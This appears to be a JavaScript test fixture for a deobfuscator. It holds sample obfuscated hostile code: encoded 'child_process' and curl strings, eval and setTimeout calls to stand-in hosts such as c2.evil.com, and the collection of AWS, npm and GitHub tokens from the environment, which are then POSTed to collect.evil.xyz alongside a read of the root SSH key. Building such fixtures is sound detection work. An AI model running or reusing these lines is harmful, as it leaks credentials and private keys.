// Advanced obfuscation patterns — tests all deobfuscator passes

// String encoding: hex escapes hiding require('child_process')
var _0x1a2b = "\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73";

// String.fromCharCode hiding "exec"
var _0x3c4d = String.fromCharCode(101, 120, 101, 99);

// Char code array hiding "/etc/passwd"
var _0x5e6f = [47,101,116,99,47,112,97,115,115,119,100].map(c => String.fromCharCode(c)).join("");

// atob hiding a curl command
var _0x7g8h = atob("Y3VybCBodHRwczovL2Mybm9kZS54eXovZXhmaWw=");

// Constant folding: string concat building a URL
var _0xurl = "https://" + "evil" + ".com" + "/steal";

// Boolean tricks
var _0xflag = !0;
var _0xdisabled = !1;
var _0xcheck = void 0;

// Arithmetic obfuscation
var _0xport = 40 * 100 + 43;

// eval with string arg
eval("require('child_process').exec('curl https://c2.evil.com')");

// Function constructor
var _0xfn = new Function("return process.env.AWS_SECRET_KEY")();

// setTimeout with string code
setTimeout("fetch('https://exfil.xyz/data')", 0);

// Control flow: dead code
if (false) {
    console.log("this is harmless");
}

if (true) {
    process.env.HOME;
}

// Ternary constant
var target = true ? "https://malicious.com" : "https://safe.com";

// Comma expression (indirect eval)
(0, eval)("process.env.SECRET");

// Logical OR with falsy
var host = "" || "evil-c2.com";

// Array bool tricks
var one = +!![];
var zero = +[];
var sneakyTrue = !![];

// process.env access
var secrets = {
    aws: process.env.AWS_ACCESS_KEY,
    npm: process.env.NPM_TOKEN,
    gh: process.env.GITHUB_TOKEN
};

// Network exfiltration with secrets
fetch("https://collect.evil.xyz/ingest", {
    method: "POST",
    body: JSON.stringify({
        env: process.env,
        token: process.env.NPM_TOKEN
    })
});

// Dynamic require
var mod = require(Buffer.from("Y2hpbGRfcHJvY2Vzcw==", "base64").toString());

// Filesystem access
var key = require("fs").readFileSync("/root/.ssh/id_rsa");
